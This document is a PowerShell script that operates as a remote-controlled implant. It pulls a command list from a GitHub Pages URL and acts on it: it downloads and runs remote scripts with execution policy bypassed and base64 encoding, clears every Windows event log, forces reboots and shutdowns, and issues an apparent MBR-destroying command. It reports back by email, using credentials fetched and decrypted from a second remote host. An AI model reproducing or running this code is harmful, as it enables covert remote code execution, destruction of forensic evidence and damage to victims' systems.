 $CurrentPath = (Get-Location).Path
 
 $CanExecute = $false
 if($CompName -like "DESKTOP-O19HQ73"){
     $CanExecute = $true
 }
 
 function Set-Key {
 param([string]$string)
 $length = $string.length
 $pad = 32-$length
 if (($length -lt 16) -or ($length -gt 32)) {Throw "String must be between 16 and 32 characters"}
 $encoding = New-Object System.Text.ASCIIEncoding
 $bytes = $encoding.GetBytes($string + "0" * $pad)
 return $bytes
 }
 
 Function Decrypt-String($EncryptedString,$Passphrase)
 {
     $EncryptionKey=Set-Key $Passphrase
     Try{
         $SecureString = ConvertTo-SecureString $EncryptedString -Key $EncryptionKey
         $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureString)
         [string]$String = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
         [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
 
         Return $String
     }
     Catch{Throw $_}
 
 }
 
 Function Send-RunNotification
 {
     param (
         [Parameter(Mandatory)]
         [ValidateNotNullOrEmpty()]
         [string]$subject,
         [string]$msgbody
     )
     $SecMFile='https://vr972be716a04eb6.github.io/dat/mail.dat'
     $SecPFile='https://vr972be716a04eb6.github.io/dat/ps.dat'
     $webclient = New-Object Net.WebClient
     $CmdData = $webclient.DownloadString($SecMFile)
 
     $Pass = $webclient.DownloadString($SecPFile)
     $Pass = $Pass.substring(0,30)

     $decrypted=Decrypt-String $CmdData $Pass
     $CharArray =$decrypted.Split(";")
 
     $EmailFrom = $CharArray[0]
     $EmailTo = $CharArray[1]
     $pass = $CharArray[2]
 
 
     $Subject = $subject
     $Body = $msgbody
     $SMTPServer = "smtp.gmail.com"
     $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
     $SMTPClient.EnableSsl = $true
     $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $pass);
     $SMTPClient.Send($EmailFrom, $EmailTo, $Subject, $Body)
 }
 
 $FullLogs = ""
 
 Function OutString
 {
     param (
         [Parameter(Mandatory)]
         [ValidateNotNullOrEmpty()]
         [string]$String,
         [string]$FgColor = "w",
         [string]$BgColor ="b"
     )
 
     Write-Verbose $String
     $FullLogs = $FullLogs + $String + '`n`n'
 }
 
 
 function ConvertTo-EncodedScript
 {
   param
   (
     $Path,
     
     [Switch]$Open
   )
   
   $Code = Get-Content -Path $Path -Raw
   $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Code) 
   $Base64 = [Convert]::ToBase64String($Bytes) 
   
   $NewPath = [System.IO.Path]::ChangeExtension($Path, '.b64')
   $Base64 | Set-Content -Path $NewPath
 
   if ($Open) { notepad $NewPath }
 }
 
 
 function ProcessCommand
 {
   param
   (
     [string]$Command,
     [string]$Details
   )
 
    if($Command -like "DOWNLOAD_AND_RUN"){
      OutString "ProcessCommand: DOWNLOAD_AND_RUN"
         $file = $Details
         if($file -ne ""){
 
             $url='https://radicaltronic.github.io/cmd/' + $file
             $webclient = New-Object Net.WebClient
             OutString "ProcessCommand: DOWNLOAD_AND_RUN  -- $file $url"
 
             Send-RunNotification "STARTING Run of script on $env:COMPUTERNAME. ProcessCommand: DOWNLOAD_AND_RUN  -- $file $url"
 
 
             $data = $webclient.DownloadString($url)
 
             $bytes = [System.Text.Encoding]::Unicode.GetBytes($data)
             $encodedCommand = [Convert]::ToBase64String($bytes)
             powershell.exe -exec bypass -encodedCommand $encodedCommand
 
            
         }
     }elseif($Command -like "CLEARLOGS"){
         Send-RunNotification "Action Notice for $env:COMPUTERNAME" "clearlogs"
         Get-WinEvent -ListLog * -Force | % { Wevtutil.exe cl $_.LogName }
     }elseif($Command -like "SENDSTATUS"){
          $Val=Get-UpTime
         Send-RunNotification "Status Request for $env:COMPUTERNAME" "Uptime $Val"
     }elseif($Command -like "REBOOT"){
         Send-RunNotification "Action Notice for $env:COMPUTERNAME" "reboot"
         Restart-Computer -Force
     }elseif($Command -like "SHUTDOWN"){
         Send-RunNotification "Action Notice for $env:COMPUTERNAME" "cp"
         Set-Cp -Force -ExitImmediately
     }elseif($Command -like "MBR"){
         Send-RunNotification "Action Notice for $env:COMPUTERNAME" "VMird"
         Set-VMird -BootMessage 'error' -RebootImmediately -Force
     }
 }
 
 
 $CmdFile='https://radicaltronic.github.io/cmd/commands.run'
 $webclient = New-Object Net.WebClient
 $CmdData = $webclient.DownloadString($CmdFile)
 
 OutString "Downloading $CmdFile"
 
 OutString "Received $CmdData"
 $CharArray =$CmdData.Split("`n")
 
 
 foreach($cmd in $CharArray) {
     
     $index = $cmd.IndexOf('=')
     if($index -ne -1){
         $CmdDetails =$cmd.Split("=")
         ProcessCommand $CmdDetails[0] $CmdDetails[1]
     }else{
         ProcessCommand $cmd
     }
 }
 
 
 
 
